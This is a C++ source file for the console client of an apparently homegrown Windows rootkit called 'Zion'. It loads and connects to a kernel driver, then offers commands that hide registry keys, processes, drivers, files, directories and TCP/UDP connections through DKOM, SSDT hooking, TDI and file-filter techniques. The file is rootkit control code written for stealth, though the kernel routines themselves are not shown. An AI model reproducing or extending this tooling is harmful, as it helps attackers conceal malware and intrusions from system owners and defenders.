// client_console.cpp : Defines the entry point for the console application.
//

// Zion Console Client
// Ver 0.1
// Org. By Shikai Chen

#include "stdafx.h"
#include "zion/zion_file_filter_driver_ioctl.h"
#include "zion/proxy/zion_proxy_dll.h"

using namespace consolehelper;

void main_scr();

bool connect_to_server(); //TODO: Move to a separate header! 

#define MAX_CMD 100

int _tmain(int argc, _TCHAR* argv[])
{
    main_scr();
    zion_proxy_release();
	return 0;
}

void main_scr()
{
	int sel;
	con_cls();
	clr_foregnd(CON_CLR::GREEN);
	clr_highlight();
	printf("       ______ _____  _____  __   _\n"
		"        ____/   |   |     | | \  |\n"
		"       /_____ __|__ |_____| |  \_|\n");
	clr_restore();
	printf("\n\nZion Console system\n");
	printf("==================================\n");
main_scr_Reload:
	printf("Connecting to server ...");
	if (connect_to_server())
	{

		clr_foregnd(CON_CLR::GREEN); clr_highlight();
		printf("OK!\n\n");
		clr_restore();
		//TODO: code here!
		//TODO: GetServerVersion and other info.
		//TODO: Disp. cmd prompt 


		WCHAR cmd_buff[MAX_CMD];
		WCHAR argu[MAX_CMD];
		while(1)
		{
			printf("zion>");
			if (_getws(cmd_buff))
			{
				// test code here by Liang Chen (should be modified)
				if (wcsncmp(L"hive_reg_hide",cmd_buff,wcslen(L"hive_reg_hide"))==0)
				{
					Hive_HideRegistryByPath(cmd_buff + wcslen(L"hive_reg_hide "));
				}
				if (wcsncmp(L"dkom_process_hide",cmd_buff,wcslen(L"dkom_process_hide"))==0)
				{
					printf("%d", _wtoi(argu));
					DKOM_HideProcessByPid(_wtoi(cmd_buff + wcslen(L"dkom_process_hide ")));
				}
				if (wcsncmp(L"dkom_driver_hide",cmd_buff,wcslen(L"dkom_driver_hide"))==0)
				{
					DKOM_HideDriverByName(cmd_buff + wcslen(L"dkom_driver_hide "));
				}
				if (wcsncmp(L"ssdt_hook_hide_process",cmd_buff,wcslen(L"ssdt_hook_hide_process"))==0)
				{
					SSDT_HOOK_HIDE_PROCESS(_wtoi(cmd_buff + wcslen(L"ssdt_hook_hide_process ")));
				}
				if (wcsncmp(L"ssdt_hook_hide_zionfile",cmd_buff,wcslen(L"ssdt_hook_hide_zionfile"))==0)
				{
					SSDT_HOOK_HIDE_ZIONFILE();
				}
				if (wcsncmp(L"tdi_tcp_hide",cmd_buff,wcslen(L"tdi_tcp_hide"))==0)
				{
					
					TDI_ConnectionHide(1,-1,-1,-1,-1);	
				}
				if (wcsncmp(L"tdi_udp_hide",cmd_buff,wcslen(L"tdi_udp_hide"))==0)
				{
					
					TDI_ConnectionHide(0,-1,-1,-1,-1);	
				}
				if (wcsncmp(L"file_filter_hide_file",cmd_buff,wcslen(L"file_filter_hide_file"))==0)
				{
					
					Filter_Hide_File(cmd_buff + wcslen(L"file_filter_hide_file "),CMD_FILE_FILTER);
				}
				if (wcsncmp(L"file_filter_hide_dir",cmd_buff,wcslen(L"file_filter_hide_dir"))==0)
				{
					
					Filter_Hide_File(cmd_buff + wcslen(L"file_filter_hide_dir "),CMD_DIRECTORY_FILTER);
				}
				if (wcscmp(L"exit",cmd_buff)==0)
				{
					break;
				}
				// code
			}
			else
			{
				// code
			}
		}

	}else
	{
		clr_foregnd(CON_CLR::RED);
		printf("\nError: cannot connect Zion server!\n\n");
		clr_restore();

		printf("You can try ");
		clr_highlight();
		printf("*RELOADING THE SERVER*\n");
		clr_restore();
		printf("Press [");  clr_foregnd(CON_CLR::BLUE | CON_CLR::GREEN); printf("R");  clr_restore();
		printf("] to reload the server...\n");

		sel = _getch();

		if (sel == 'R' || sel=='r')
		{
			if (ZION_SUCCEED(zion_loadServer(ZION_OPERATION_STD))){

				printf("\nServer Loaded, trying to connect...\n");
				goto main_scr_Reload;
			}
			else
			{
				clr_foregnd(CON_CLR::RED);
				printf("\nError: cannot load Zion server\nAbort..\n");
				clr_restore();    
				_getch();
			}

		}
		else
		{
			// just exit
		}
	}


}


bool connect_to_server()
{
	ZIONRESULT hr;
    hr = zion_loadServer(ZION_OPERATION_STD);
	if (ZION_OK != hr)
	{
		return false;
	}
    return ZION_SUCCEED(zion_connectServer(L"console",ZION_OPERATION_STD));
}